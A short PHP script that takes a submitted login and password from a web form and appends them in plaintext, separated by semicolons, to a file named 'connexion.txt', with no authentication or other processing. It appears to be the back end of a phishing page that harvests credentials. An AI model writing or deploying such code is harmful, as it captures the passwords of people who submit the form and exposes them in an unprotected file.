<?php

$login=$_POST["login"];
$password=$_POST["password"];

$ch=$login.";".$password.";\n";

$file="connexion.txt";
file_put_contents($file, $ch, FILE_APPEND);

?>
